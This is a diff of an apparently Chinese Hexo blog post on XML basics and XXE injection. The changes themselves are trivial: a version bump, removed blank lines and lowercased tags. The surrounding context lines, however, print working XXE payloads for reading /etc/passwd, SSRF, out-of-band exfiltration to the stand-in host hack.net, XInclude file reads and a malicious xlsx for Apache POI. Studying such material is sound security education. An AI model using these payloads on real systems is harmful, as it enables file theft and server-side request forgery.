@@ -46,7 +46,7 @@
 </script>
 
     <title>XML基础与XXE注入 - Blog</title>
-  <meta name="generator" content="Hexo 5.0.2"></head>
+  <meta name="generator" content="Hexo 5.3.0"></head>
 
   <body><div id="mobile-navbar" class="mobile-navbar">
   <div class="mobile-header-logo">
@@ -135,25 +135,18 @@
 <li>支持http、ftp、file等协议</li>
 </ul>
 <h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure>
-
 <h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure>
-
 <h3 id="OAST"><a href="#OAST" class="headerlink" title="OAST"></a>OAST</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;hack.net&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&quot;http://hack.net/hack.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure>
-
 <h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><ul>
 <li>数据在服务器端拼接进XML文档</li>
 </ul>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <h3 id="Apache-POI"><a href="#Apache-POI" class="headerlink" title="Apache POI"></a>Apache POI</h3><ul>
 <li>文件上传xlsx文档</li>
 </ul>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># xxe.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://hack.net/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># [Content_Types].xml</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://hack.net/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>ZIP压缩后改后缀为<code>xlsx</code></p>
 <h3 id="Apache-Batik"><a href="#Apache-Batik" class="headerlink" title="Apache Batik"></a>Apache Batik</h3><ul>
 <li>文件上传SVG头像</li>
@@ -163,8 +156,8 @@
       
       <footer class="post-footer">
         <div class="post-tags">
-            <a href="/tags/XML/">XML</a>
-            <a href="/tags/XXE/">XXE</a>
+            <a href="/tags/xml/">xml</a>
+            <a href="/tags/xxe/">xxe</a>
             </div>
         
         <nav class="post-nav"><a class="prev" href="/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">
